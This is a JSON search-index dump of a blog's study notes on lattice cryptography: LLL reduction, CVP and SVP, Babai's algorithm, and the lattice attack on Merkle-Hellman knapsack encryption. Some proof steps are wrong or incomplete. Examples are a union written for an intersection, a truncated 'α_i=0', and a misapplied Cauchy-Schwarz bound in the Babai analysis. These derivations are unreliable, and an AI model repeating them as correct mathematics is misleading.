Cryptography 相比于RSA的模幂运算，背包密码的运行速度要快的多。 在非齐次情况下求解小范数根，了解 Knapsack Cryptography 及其 attack 是十分有帮助的。 ","date":"2023-06-18","objectID":"/lattice-part-3/:5:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"The Subset-Sum Problem We begin by recalling the definition of the subset-sum problem, also called the “knapsack” problem, in its search form. ","date":"2023-06-18","objectID":"/lattice-part-3/:5:1","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Superincreasing sequence ","date":"2023-06-18","objectID":"/lattice-part-3/:5:2","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Merkle Hellman Start with some superincreasing sequence $\\boldsymbol{b} = (b_1,\\dots,b_n)$ Choose some modulus $m\u003e\\sum_{i=1}^n b_i$, uniformly random $w \\leftarrow\\mathbb{Z_m}^{*}$ and uniformly random permutation $\\pi$ on $\\set{1,\\dots,n}$ Let $a_i=w\\cdot b_{\\pi(i)}\\mod m$. The public key is $a = ( a_1, \\ldots , a_n)$, and the trapdoor is $(m,w,\\pi).$ The encryption of a message $\\mathbf{x}\\in{0,1}^n$ is then $$ s=\\mathsf{Enc_\\mathbf{a}}(\\mathbf{x})=\\langle \\vec a,\\mathbf{x}\\rangle=w \\cdot \\sum_{i=1}^{n} b_{\\pi(i)} x_{i}. $$Given the trapdoor $(m,w,\\pi)$, we can decrypt $s$ as follows: Simply compute $$ s^{'}=w^{-1}s=\\sum_{i=1}^{n} b_{\\pi(i)}x_i\\mod m $$then solve the subset-sum problem for the permuted superincreasing $b$ and $s^{\\prime}$. 上述描述的原始 Knapsack 过程直接规约在 CVP 即可求解。在实际过程中不必考虑置换过程，直接考虑原始置换后的向量为目标向量即可。 ","date":"2023-06-18","objectID":"/lattice-part-3/:5:3","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Density The density of a subset-sum problem instance is $$ n/\\max_i \\log a_i $$ ","date":"2023-06-18","objectID":"/lattice-part-3/:5:4","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Lagarias-Odlyzko, Frieze 同样的利用上面给出的思路证明这个引理，但需要加入一些概率视角。 证明的核心思路为Embedding Technique. PROOF 在构造完 $\\bold{B}$ 后，$(x,0)^T \\in B$. 最后一行系数 $B$ 用于放缩. 值得关心的是这个算法取得目标向量的概率。 $$ \\bold{Bz}= (x,0)^T \\in \\mathcal{L},\\Vert \\bold{Bz}\\Vert \\le \\sqrt{n} $$ 对于这个格空间内的任一向量，最后一项为 $B$ 的倍数时（不含0），那么 $$ B \\gt 2^{n/2}\\cdot \\Vert x \\Vert \\ge 2^{n/2}\\cdot \\lambda_1(\\mathcal{L}) $$ 故而 $\\bold{B}$ 的 LLL 规约结果一定会有末项为 $0$ 的向量, 且范数最大为$2^{n/2}\\sqrt n$。( LLL property ) 故而在密度（density）不合适的时候，这里可能会解出 $k(x,0)$. 在处理格的概率分析时，只需要严格抓住格的均匀分布特征即可。不难有如下描述 引入参数 $\\epsilon$ 来刻画 $O(1)$ ","date":"2023-06-18","objectID":"/lattice-part-3/:5:5","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Summary Knapsack 这里重新给出一个简单版本的表述： 私钥为一个超递增序列 $\\set{a_n}$ , 满足 $a_i\\gt \\sum_{k=1}^{i-1}a_k$ , 模数$m$ ,满足$m\u003e\\sum_{i=1}^na_i$ ,乘数$w$ ,满足 $\\gcd ( w, m) = 1$ . 公钥为$\\boldsymbol{b} = (b_1,\\dots,b_n)$ ,满足 $b_i\\equiv wa_i\\pmod m$ 加密：设明文为 ${v_i},v_i\\in{0,1}$ ,则密文 $c$ 可表示为： $$ c \\equiv \\sum_{i=1}^{n} b_i v_i \\equiv \\sum_{i=1}^{n} wa_i v_i \\pmod m $$明文$v$: $$ v = w^{-1}c \\equiv \\sum_{i=1}^{n} v_i a_i \\pmod m $$构造矩阵 $$ \\mathcal{L} = \\begin{bmatrix} I \u0026 \\boldsymbol{b}^T \\\\\\\\ 0 \u0026 -c \\end{bmatrix} $$$v = (v_1, \\dots, v_n, 0) \\in \\mathcal{L}$. 利用高斯启发式，可以证明我们能够规约出$v$. $$ \\sigma(\\mathcal{L}) = \\sqrt{\\frac{n}{2\\pi e}}\\Vert det\\mathcal{L} \\Vert^{1/(n+1)} = \\sqrt{\\frac{n}{2\\pi e}} c^{1/(n+1)} $$而 $$ \\Vert v \\Vert \\approx \\sqrt{n/2} \\le \\sigma(\\mathcal{L}) $$即 $$ \\frac{1}{\\pi e} c^{2/(n+1)} \\le 1 $$有$1-2^{-n^2(\\varepsilon-o(1))}$有解。 ","date":"2023-06-18","objectID":"/lattice-part-3/:5:6","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"References Babai’s Algorithm Knapsack Shortest Lattice Vectors in the Presence of Gaps Tover’s Blog ISIS problem discussion in LINK1,LINK2 SIS problem discussion in LINK1 A decade of lattice cryptography Cryptohack gitbook ISIS-small-q-code ISIS-small-q-paper Embedding attack ","date":"2023-06-18","objectID":"/lattice-part-3/:6:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Describe an approximation algorithm to the Closest Vector Prolem. While LLL for SVP. ","date":"2023-06-14","objectID":"/lattice-part-2/:0:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"The Closest Vector Problem Definition : Given a target vector $\\boldsymbol{t}\\in\\mathbb{R}^n$ and a lattice $\\mathcal{L}\\subset\\mathbb{R}^n$, we define $$\\operatorname{dist}(\\mathcal{L},\\boldsymbol{t}):=\\min_{\\boldsymbol{x}\\in\\mathcal{L}}\\Vert\\boldsymbol{x}-\\boldsymbol{t}\\Vert\\:.$$ ","date":"2023-06-14","objectID":"/lattice-part-2/:1:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Hardness of CVP and relationship with SVP 将 CVP 规约到 SVP 上来。 及时二者均已证明为 NP 问题，但是二者的困难程度却是迥异的。$\\gamma$-SVP 要简单的多，CVP 也可视作 SVP 的非齐次形式。 一般的 SVP 工作在线性空间 $\\mathcal{L}$ 上，而相对的 CVP 工作在 $\\mathcal{L}$ 的一个陪集 $\\mathcal{L}- t$ 上。但由于所定义短向量不包含零向量，故不可直接更换工作所在群，直接规约 CVP 到 SVP. 那么如何绕过零向量构成的难题呢？构造陪集。 ","date":"2023-06-14","objectID":"/lattice-part-2/:2:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"What we do in SVP 实际上这是一个存在性证明，我们回顾在处理 SVP 问题中的处理: Blichfeld 为了证明这一引理 我们介绍 Fundamental Parallelepiped $\\mathcal{P}(B)$ Given the lattice basis vectors ${b_1,b_2,\\ldots,b_n}$, the fundamental parallelepiped $\\mathsf{P}(B)$ is the set of all linear combinations of these basis vectors with coefficients in the interval $[0,1)$. Mathematically, it is defined as: $$ \\mathcal{P}(B)= \\set{ \\sum_{i=1}^n \\lambda_{i} b_{i} \\mid {0} \\le \\lambda_{i} \\lt {1} } $$利用这里的基本域，接着可以对整个格空间大小，以行列式为单位进行划分: 不难发现 $$ \\sum_{x\\in\\Lambda}\\operatorname{vol}(\\widehat{S_x})=\\sum_{x\\in\\Lambda}\\operatorname{vol}(S_x)=\\operatorname{vol}(S)\u003e\\operatorname{vol}(\\mathcal{P}(B))=\\det \\Lambda. $$ 接下来便是优雅的鸽巢定理： 即 Since the combined volume of all $\\widehat{S_x}$ is greater than the volume of $\\mathcal{P}(B)$, there must be overlap among these translated regions. Therefore, there exist some $x,y \\in \\Lambda$ with $x \\ne y$ such that $\\widehat{S_x}$ and $\\widehat{S_y}$ intersect: $$ \\widehat{S_x} \\cup \\widehat{S_y} \\ne \\emptyset $$ Let $z$ be a point in this intersection. Then $z+x$ is in $S_x\\subseteq S$ and $z+y$ is in $S_y\\subseteq S$. The difference $(z+x)-(z+y)=x-y$ is in $\\Lambda$, proving that $S$ contains at least two points whose difference is a lattice vector. Q.E.D Minkowski’s Convex Body Theorem 这可以视作 Blichfeld 的推论，以为只需要注意调整系数的技巧和凸集的性质，便可证明: 不难发现这里的系数是以集合定义来调整响应系数。利用中心对称，构造一个向量。 综合上述思考过程，我们在坐标原点构造中心对称凸集、根据广义体积大小确定格点存在性，那么一个平凡的想法是对原有线性空间做一个划分，那么在每个划分中，可以做这样的分析来证明存在性，以此来构建近似求解 CVP 的可行性，那么在抽象代数中，对一个良好的代数结构进行划分的做法，一般的，构造陪集。 ","date":"2023-06-14","objectID":"/lattice-part-2/:2:1","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Reduce CVP to SVP 构造陪集的难点在于如何避开零向量的干扰。 即如何刻画一个划分，让我们的目标短向量落入其中，而零向量不在此列。技巧源于观察。观察短向量的坐标特征: 各个坐标项的至少有一个坐标为奇数（利用反证法容易证明）。具有这样特征结构的陪集，十分良好的规避了零向量的干扰。 PROOF: 其后的处理类同 SVP 的处理。 ","date":"2023-06-14","objectID":"/lattice-part-2/:2:2","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Babai’s Algorithm 欣喜地，我们在存在性的基础上，深入学习一个近似算法。 ","date":"2023-06-14","objectID":"/lattice-part-2/:3:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Pause GS in geometric 让我们留下一个基向量及其系数，来作为可以唯一确定超平面的参数 我们处理GS过程时，处理到 $b_n$ 时，便会留下一个子空间，由 $b_n$ 的线性组合决定。 The $n$ th Gram-Schmidt vector, $\\widetilde{\\boldsymbol{b_n}}$ , has a very nice geometric interpretation. In particular, consider the hyperplane (i.e. affine subspace) defined by all vectors $\\boldsymbol x \\in\\mathbb{R}^n$ (not necessarily lattice vectors) whose last coordinate is $c$ for some fixed $c$： $$ H_{c} := \\Set{ \\sum_{i=1}^{n-1} a_{i} \\boldsymbol{b_i} + c \\boldsymbol{b_n}} $$Notice in particular that $H_{c} = H_{0}+c\\boldsymbol{b_n}$ . But, since $\\boldsymbol{b_n}$ is typically not orthogonal to $H_{0}$, the distance between $H_{0}$ and $H_{c}$ to the origin will typically not be $c \\Vert \\boldsymbol{b_n}\\Vert$ Instead, the distance will be the length of the component of $c \\boldsymbol{b_n}$ that is orthogonal to $H_{0}$ . I.e., it will be $c \\Vert \\widetilde{\\boldsymbol{b_n}}\\Vert$. 基于不同的系数 $c$ 原有格空间可以做这样的划分（以二维为例）： 接下来用一种递归的思路，同样的可以对剩下的每个 $n-1$ 维，做同样的处理。 ","date":"2023-06-14","objectID":"/lattice-part-2/:3:1","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Babai’s nearest hyperplane algorithm 基于上述的理解模型，可以把向量 $t$ 放置于各个超平面之间： With this picture in mind, the idea behind Babai’s algorithm is quite simple. Given a target vector $\\boldsymbol{t}\\in\\mathbb{R}^n$ and a lattice $\\mathcal{L}\\subset\\mathbb{R}^n$ with some basis $(\\boldsymbol{b_1},\\ldots,\\boldsymbol{b_n})$, it seems reasonable to look for a lattice vector that is close to $\\boldsymbol{t}$ inside the closest lattice hyperplane to $\\boldsymbol{t}$. So, Babai’s $\\textit{ nearest hyperplane algorithm }$ [Bab86] works by first identifying the nearest lattice hyperplane $H_c$ to $\\boldsymbol{t}$. For example, Babai’s algorithm would choose the hyperplane $H_{-1}$ in this example (though the closest vector to $\\boldsymbol{t}$ happens to lie in $H_0$ ): $H_c$ 包含了由 $n-1$ 个基向量张成的子格 $\\mathcal{L}^{’}$ 的一个陪集 $\\mathcal{L}^{’}+cb_{n}$ . 而 $\\mathcal{L}^{’}+cb_{n}$ 又可继续做陪集的划分。 对 $n - i + 1$ 维 不断进行处理，则可以最终停留在一个向量上，在此前的陪集划分后，选择子空间只需不断保证欧几里得距离的最优，便可得到近似求解 CVP 问题的一个解。 ","date":"2023-06-14","objectID":"/lattice-part-2/:3:2","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Huck Bennett suggestion Easier to understand. In coset $\\mathcal{L} - t$ , first we rotate space so that the basis $(b_1,\\dots,b_n)$ is upper triangular and looks like : Rewrite the vector $t$ in this rotated space. $$ \\boldsymbol{t}=\\begin{pmatrix}t_{1} \\\\\\\\ t_{2} \\\\\\\\ \\vdots \\\\\\\\ t_{n} \\end{pmatrix} $$那么此前描述的陪集划分与选择的过程实际上可以重新表述为： 在给定陪集中这个寻找第 $n$ 个坐标为最小的的向量。由于每次仅处理一个基向量，故前后处理互不影响。 对于参数 $c$ 的选择依旧按照向量投影的原则，定义四舍五入的运算。那么算法最终结束时，输出 $s$ 即可。 ","date":"2023-06-14","objectID":"/lattice-part-2/:3:3","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Analysis ","date":"2023-06-14","objectID":"/lattice-part-2/:4:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Property 1 Babai Nearest Algorithm 工作在 LLL 约简基当中，故而这一性质十分显然。 GS 中可以把一个向量在基变换后重新写为： $$ \\boldsymbol{x} = \\sum\\frac{\\langle\\widetilde{\\boldsymbol{b_{i}}},\\boldsymbol{x}\\rangle}{\\Vert\\widetilde{\\boldsymbol{b_{i}}}\\Vert^{2}}\\cdot\\widetilde{\\boldsymbol{b_{i}}} $$ Babai 中的系数形式为 $$ \\langle\\widetilde{\\boldsymbol{b_{n-i+1}}},\\boldsymbol{s}\\rangle / \\Vert \\widetilde{\\boldsymbol{b_{n-i+1}}}\\Vert ^{2} $$大约在 $1/2$ 的数量级（上界），故而通过简单的不等式放缩可以证明 PROOF: Vector Decomposition Using Gram-Schmidt Vectors: Any vector $t\\in\\operatorname{span}(B)$ can be decomposed in terms of the Gram-Schmidt orthogonal basis ${\\tilde{b}_i}:$ $$ t=\\sum_{i=1}^n\\alpha_i\\tilde{b}_i $$where $\\alpha_i=0$ Approximation Quality Since the algorithm rounds each coefficient $\\alpha_i$ to the nearest integer, the difference between $x$ and $t$ can be bounded. Specifically, for each $i$: $$ |\\alpha_i-\\text{round}(\\alpha_i)|\\leq\\frac12. $$ Therefore, the distance between $x$ and $t$ can be expressed as a sum of these small deviations over all Gram-Schmidt vectors: $$ x=\\sum_{i=1}^n\\mathrm{round}(\\alpha_i)\\tilde{b}_i. $$Bounding the Distance: The distance $\\Vert x-t \\Vert$ is thus related to the error in each dimension: $$ x-t=\\sum_{i=1}^n(\\text{round}(\\alpha_i)-\\alpha_i)\\tilde{b}_i $$Since |round$(\\alpha_{i})-\\alpha_{i}|\\leq\\frac12$,we have: $$ \\Vert x-t\\Vert \\leq\\sum_{i=1}^n |\\text{round}(\\alpha_i)-\\alpha_i| \\Vert\\tilde{b_i}\\Vert \\leq\\frac{1}{2}\\sum_{i=1}^{n} \\Vert \\tilde{b_i}\\Vert. $$Squared Distance Bound: The squared distance is then: $$ \\Vert s \\Vert^2 = \\Vert x-t\\Vert^2 \\leq \\left(\\frac{1}{2}\\sum_{i=1}^{n} \\Vert \\tilde{b_i} \\Vert \\right)^2 \\leq \\frac{1}{4}\\sum_{i=1}^{n}\\Vert \\tilde{b_i}\\Vert^2. $$ The last inequality follows from the Cauchy-Schwarz inequality, which ensures that the sum of squares of the individual terms is an upper bound on the square of their sum. In fact, ","date":"2023-06-14","objectID":"/lattice-part-2/:4:1","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Property 2 The output vector is determinated by the coset. PROOF: Babai’s behaviour Babai’s algorithm divides space into hyper-rectanges according to GS vectors. The output of Babai’s algorithm depends only on where the input lands modulo this tiling 这实际上说明了 Babai 在一定范围内一定会得到想要结果，而值得深入研究的是这里的 $\\gamma$-CVP 中的 $\\gamma$ 是否可以找到一个上界，或这样的上界是否能够继续优化。 在这样的模型思考下，我们形式上可以给出一个基础的 Bound : $$ \\gamma\\leq\\frac{\\left(\\sum\\Vert\\widetilde{\\boldsymbol{b_{i}}}\\Vert^{2}\\right)^{1/2}}{\\min\\Vert\\widetilde{\\boldsymbol{b_{i}}}\\Vert} $$ 而这个 Bound 还有优化空间： ","date":"2023-06-14","objectID":"/lattice-part-2/:4:2","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Property 3 PROOF: 注意到： 即使在$\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003e|\\widetilde{\\boldsymbol{b}}_i|/2$的情况下，Babai 算法仍可能正确地选择某些坐标。 当 $\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003c|\\widetilde{\\boldsymbol{b}}_n|/2$ 时，显然最近的向量在最近的格子超平面上，因为其他超平面上的向量距离 $t$ 至少 $\\Vert\\widetilde{\\boldsymbol{b}}_n\\Vert /2$, 大于$\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})$。 所以 Babai 算法会选择正确的第 $n$ 个坐标。 更一般地，如果对于某个 $i$ , $\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003c\\Vert\\widetilde{\\boldsymbol{b}}_j\\Vert/2$ 对所有 $j\\geq i$ 成立，那么 Babai 算法将正确选择所有 $j\\geq i$ 的坐标，并且输出向量满足： $$ \\|\\boldsymbol{s}\\|^2\\leq\\frac12\\sum_{j=1}^i\\Vert\\widetilde{\\boldsymbol{b}}_j\\Vert^2+\\operatorname{dist}(\\boldsymbol{t},\\mathsf{L})^2 $$如果 $\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003c\\Vert\\widetilde{\\boldsymbol{b}}_i\\Vert/2$ 对所有 $i$ 成立，那么我们知道输出是正确的，因此可以假设存在某个 $i\\in {1,\\ldots,n}$ 使得$\\ \\operatorname{dist}( \\boldsymbol{t}, \\mathcal{L} ) \\geq \\Vert \\widetilde{\\boldsymbol{b}} _i\\Vert / 2$ , 并且可以取 $i$ 为满足此性质的最大值。 故而： $$ \\Vert\\boldsymbol{s}\\Vert^2\\leq\\frac{1}{2}\\sum_{j=1}^{i}\\Vert\\widetilde{\\boldsymbol{b_j}}\\Vert^2+\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})^2\\leq\\frac{\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})^2}{\\Vert\\widetilde{\\boldsymbol{b_i}}\\Vert^2}\\cdot\\sum_{j=1}^{i}\\Vert\\widetilde{\\boldsymbol{b_j}}\\Vert^{2}+\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})^2 $$ 我们来看这一推导的具体细节： PROOF ","date":"2023-06-14","objectID":"/lattice-part-2/:4:3","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Corollary 由 LLL 约简基的性质不难证明 Just like in the SVP case, slightly better approximation factors are known using BKZ bases (which generalize LLL bases). In particular, for any constant $C\u003e0$, there is an efficient algorithm that solves $2^{Cn\\log\\log n / \\log n}$-CVP ","date":"2023-06-14","objectID":"/lattice-part-2/:4:4","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"References Lattice in Cryptoanalysis Babai’s Algorithm CVP ","date":"2023-06-14","objectID":"/lattice-part-2/:5:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":" Regev讲义学习笔记 ","date":"2023-05-26","objectID":"/lattice-part-1/:0:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Everything Before ​ 我们的目标是求解近似求解SVP问题，基于此构建了一个具有特殊结构的基，为了构建这样的代数结构，设计出一类规约算法，并验证了正确性和时间复杂度的可行性。基于这样的思路，可以在规约算法上进行优化，在代数结构上进行调整，获得更好的近似求解表现。 ​ 在具有这样的清晰思路后，再来考虑代数工具的构建，将会使工作更加完善。 ","date":"2023-05-26","objectID":"/lattice-part-1/:1:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Reduced Basis 注意到 将一个普通正交基，规约为一个约简基总是可以的。 给出这样的定义，实则是基于我们的研究对象一些代数上表现良好的结构，使得可以很好的利用这样的约简基，配合闵可夫斯基界，我们可以给出一个SVP的近似求解，对于近似精度，我们再利用参数 $\\delta$ 来进行很好的刻画，在后面的学习中将会看到这里的 $\\delta = \\frac{3}{4}$ 时，会得到一个非常良好的规约结果。 利用简单的三角不等式: $$ \\begin{cases} \\delta{\\Vert\\tilde{b_{i}}\\Vert}^{2}\\leq{\\Vert\\mu_{i+1,i}\\tilde{b_{i}}+\\tilde{b_{i+1}}\\Vert}^{2}=\\mu_{i+1,i}^{2}{\\Vert\\tilde{b_{i}}\\Vert}^{2}+{\\Vert\\tilde{b_{i+1}}\\Vert}^{2} \\tag{1} \\\\\\\\ \\Vert\\tilde{b_{i+1}}\\Vert^2\\geq(\\delta-\\mu_{i+1,i}^2)\\Vert\\tilde{b_i}\\Vert^2\\geq(\\delta-\\frac{1}{4})\\Vert\\tilde{b_i}\\Vert^2 \\end{cases} $$实际上，我们的格工作在 $p$ 范数空间。 进一步的,$(1)$，说明了两个相邻基向量不会相差太大 Schmit process中，不难发现， 所得到的基向量列向量优先可以得到，如下矩阵 即 从 $$ \\tilde{b_i}=b_i-\\sum_{j=1}^{i-1}\\mu_{i,j}\\tilde{b_j},where\\mu_{i,j}=\\frac{\\langle b_i,\\tilde{b_j}\\rangle}{\\langle\\tilde{b_j},\\tilde{b_j}\\rangle}. $$到如下矩阵的一个转变 $$ \\begin{pmatrix}\\Vert\\tilde{b_1}\\Vert\u0026 \\* \u0026\\cdots\u0026 \\* \\\\\\\\ 0\u0026\\Vert\\tilde{b_2}\\Vert\u0026\\cdots\u0026 \\* \\\\\\\\ \\vdots\u0026\u0026\\ddots\u0026\\vdots \\\\\\\\ \u0026\u0026\u0026 \\* \\\\\\\\ 0\u0026\\cdots\u0026\u0026\\Vert\\tilde{b_n}\\Vert\\end{pmatrix} $$ 当 $\\delta = \\frac{3}{4}$ 时，所得矩阵概览便为： $$ \\begin{pmatrix}\\Vert\\tilde{b_1}\\Vert\u0026\\leq\\frac12\\Vert\\tilde{b_1}\\Vert\u0026\\cdots\u0026\u0026\\leq\\frac12\\Vert\\tilde{b_1}\\Vert \\\\\\\\ 0\u0026\\Vert\\tilde{b_2}\\Vert\u0026\\cdots\u0026\u0026\\leq\\frac12\\Vert\\tilde{b_2}\\Vert \\\\\\\\ \\vdots\u0026\u0026\\ddots\u0026\u0026\\vdots \\\\\\\\ \u0026\u0026\u0026\u0026\\leq\\frac12\\Vert\\tilde{b_{n-1}}\\Vert \\\\\\\\ 0\u0026\\cdots\u0026\u0026\u0026\\Vert\\tilde{b_n}\\Vert\\end{pmatrix} $$以上的工作均是在 Gram-Schmit 做微调下，实现这样的结果，但是直到现在我们尚未把所做工作同 SVP-approximation 联系起来。 ","date":"2023-05-26","objectID":"/lattice-part-1/:2:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"What can LLL do? 更清晰的来说： ","date":"2023-05-26","objectID":"/lattice-part-1/:3:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Short Vector and Reduced basis 接下来我们证明CLAIM 1. 为了用符号语言的形势推导，我们引入 $\\lambda_i$, 也是格中最为基础的参数之一。 针对这一定义可推导出 $\\lambda_1(\\mathcal{L}(B))\\geq\\min_{i=1,…,n}\\Vert\\tilde{b}_i\\Vert\u003e0.$ 施密特正交化处理所得正交基向量的范数一定小于等于第一最短向量。 同样的，直觉的感受需要同形式化的证明相结合，利用求和符号、范数、正交的一些性质可得到 PROOF: Let $x\\in\\mathbb{Z^n}$ be an arbitrary nonzero integer vector, and let us show that $\\Vert Bx \\Vert \\geq \\min{\\Vert\\tilde{b_i}\\Vert}.$ Let $j\\in{1,\\ldots,n}$ be the largest such that $x_j \\neq 0.$ Then $$ |\\langle Bx,\\tilde{b_j}\\rangle|=|\\langle\\sum_{i=1}^jx_ib_i,\\tilde{b_j}\\rangle|=|x_j|\\langle\\tilde{b_j},\\tilde{b_j}\\rangle=|x_j|\\Vert\\tilde{b_j}\\Vert^2 $$ where we used that for all $i\u003cj,\\langle b_i,\\tilde{b_j}\\rangle=0$ and that $\\langle b_j,\\tilde{b_j}\\rangle=\\langle\\tilde{b_j},\\tilde{b_j}\\rangle.$ On the other hand, $\\Vert \\langle Bx,\\tilde{b_j}\\rangle \\Vert \\leq \\Vert Bx \\Vert \\cdot \\Vert\\tilde{b_j}\\Vert$, (Cauchy-Schwarz Inequality) ,and hence we conclude that $$ \\Vert Bx \\Vert \\geq \\|x_j\\| \\Vert\\tilde{b_j}\\Vert\\geq\\Vert\\tilde{b_j}\\Vert\\geq \\min{\\Vert\\tilde{b_i}\\Vert.} $$这里需要指明的是 $Bx$ 可视为 $x$ 经线性变换 $B$, 得到在变换后空间中的表示。 即可以可逆矩阵 $B$ 作为线性变换，可以视为一种映射。 进一步的 ","date":"2023-05-26","objectID":"/lattice-part-1/:3:1","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"PROOF The Claim 回顾刚刚的CLAIM1: 至此，应用 $\\lambda$ 的性质，以及施密特正交基的最短 ( $l_2$ 意义上) 基向量与 $\\lambda_1(\\mathcal{L})$ 的关系，利用简单的系数放缩，便可以完成证明，也同时很好的将我们最开始定义 Reduced Basis 的工作同 SVP 问题相结合。 PROOF: Since for any basis $b_1,\\ldots,b_n,\\lambda_1(\\mathcal{L})\\geq\\min_i\\Vert\\tilde{b_i}\\Vert$,we get that $$ \\Vert\\tilde{b_n}\\Vert^{2} \\geq(\\delta-\\frac{1}{4})\\Vert\\tilde{b_{n-1}}\\Vert^{2} \\geq \\ldots \\geq(\\delta-\\frac14)^{n-1} \\Vert\\tilde{b_1}\\Vert^{2} =(\\delta-\\frac{1}{4})^{n-1}\\Vert b_{1} \\Vert^2 $$where the last equality follows by the definition $\\tilde{b_1}=b_1.$ Then, for any $i$, $$ \\Vert\\tilde{b_1}\\Vert\\leq\\left(\\delta-\\frac14\\right)^{-(i-1)/2}\\Vert\\tilde{b_i}\\Vert\\leq\\left(\\delta-\\frac14\\right)^{-(n-1)/2}\\Vert\\tilde{b_i}\\Vert. $$Hence, $$ \\Vert b_{1} \\Vert \\leq \\left(\\delta-\\frac{1}{4}\\right)^{-(n-1)/2} \\min_i{\\Vert\\tilde{b_i}\\Vert} \\leq \\left(\\delta-\\frac{1}{4}\\right)^{-(n-1)/2} \\cdot \\lambda_{1}(\\mathcal{L}) $$对于 $\\delta = \\frac{3}{4}$ 的情况，代入即可: 此时，我们已经说明了一个代数结构，很好的符合了我们 SVP-Approximation 的出发点，于此我们引入算法上的工作，这包含了算法设计与时间复杂度分析。时间分析这部分暂略过，值得注意的是 LLL 的表现好于保守分析的结果。 ","date":"2023-05-26","objectID":"/lattice-part-1/:3:2","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Way to LLL 也即我们现在要完成一个矩阵到矩阵的变换。 初等列变换保证矩阵的可逆性，加入线性乘子保障范数符合条件。在施密特正交化过程中加入 REMARK 6 ，保证了这里的系数 $\\frac{1}{2}$ , 而 SWAP 过程保证 约简基性质2. 严格意义上的 ","date":"2023-05-26","objectID":"/lattice-part-1/:4:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Open Probelm ","date":"2023-05-26","objectID":"/lattice-part-1/:5:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Application 我们将继续深入探究格规约所带来的全新分析视角。 ","date":"2023-05-26","objectID":"/lattice-part-1/:6:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Reference Regev讲义 Lattices in Cryptography ","date":"2023-05-26","objectID":"/lattice-part-1/:7:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":null,"content":"About Halois","date":"2023-04-12","objectID":"/about/","tags":null,"title":"About me","uri":"/about/"},{"categories":null,"content":"Halois 摸鱼划水选手。 Contact Me: qq: MjkxMTk1NTc2MA== email: maocred@gmail.com 指路：公众号 Warning: 公众号并非技术类 XD ","date":"2023-04-12","objectID":"/about/:0:0","tags":null,"title":"About me","uri":"/about/"},{"categories":[],"content":"1.Lattice(格) 基础 基于数学与计算机，现代密码学诞生。 ","date":"2023-04-04","objectID":"/lattice-part-0/:0:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.1 Lattice 系统性的定义一下Lattice的话，那么我们可以说Lattice是R^n这个空间中的一个离散的、具有加法运算的子群（A discrete additive subgroup）。 结合可视化工具，这里给出辅助理解的图像： 结合向量空间的概念，不难理解**格（Lattice)与基（bases)**的概念 ","date":"2023-04-04","objectID":"/lattice-part-0/:1:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2 Lattice 的基本属性 ","date":"2023-04-04","objectID":"/lattice-part-0/:2:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.1 Lattice 的密度 即可理解为对应维度的向量空间内球体内所含有的格点数和球体体积之比（或超球体） ","date":"2023-04-04","objectID":"/lattice-part-0/:2:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.2 最短距离 λ 将λ视为一个函数，λ1被定义为两格点间最小距离，推广至λn 诸多λ遵循偏序关系: $$ 